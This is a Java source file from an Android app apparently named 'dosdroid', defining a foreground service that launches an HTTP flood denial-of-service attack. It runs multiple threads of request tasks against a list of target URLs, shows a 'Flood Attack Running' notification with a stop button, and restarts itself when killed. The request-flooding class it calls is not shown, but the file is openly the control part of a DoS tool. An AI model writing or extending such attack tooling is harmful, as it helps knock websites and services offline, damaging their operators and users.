package com.nemesis.dosdroid;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.os.Build;
import androidx.core.app.NotificationCompat;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class AttackService extends Service {
    private static final int NOTIFICATION_ID = 1;
    private static final String CHANNEL_ID = "AttackServiceChannel";
    private ExecutorService executorService;

    @Override
    public void onCreate() {
        super.onCreate();
        executorService = Executors.newFixedThreadPool(HttpFloodAttack.NUM_THREADS);
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startAttack();
        return START_STICKY;
    }

    private Notification createNotification() {
        Intent stopIntent = new Intent(this, MainActivity.class);
        stopIntent.setAction("STOP_ATTACK");

        PendingIntent stopPendingIntent = PendingIntent.getActivity(
                this, 0, stopIntent,
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.S ?
                        PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE :
                        PendingIntent.FLAG_UPDATE_CURRENT
        );

        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Flood Attack Running")
                .setContentText("The HTTP flood attack is currently running.")
                .setSmallIcon(R.drawable.ic_attack) // Default icon used here
                .addAction(android.R.drawable.ic_delete, "Stop Attack", stopPendingIntent)
                .build();
    }


    private void createNotificationChannel() {
        NotificationChannel serviceChannel = new NotificationChannel(
                CHANNEL_ID, "Attack Service Channel", NotificationManager.IMPORTANCE_LOW);
        NotificationManager manager = getSystemService(NotificationManager.class);
        manager.createNotificationChannel(serviceChannel);
    }

    private void startAttack() {
        // Start HTTP flood attack using HttpFloodAttack class
        ExecutorService executorService = Executors.newFixedThreadPool(HttpFloodAttack.getNumThreads());

        for (String url : HttpFloodAttack.targetUrls) { // Loop through each target URL
            for (int i = 0; i < HttpFloodAttack.getNumThreads(); i++) {
                executorService.execute(new HttpFloodAttack.HttpRequestTask(url)); // Pass the URL to the task
            }
        }

        executorService.shutdown();
    }


    @Override
    public void onDestroy() {
        super.onDestroy();
        executorService.shutdownNow(); // Stop the executor service
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null; // Not using binding
    }
}
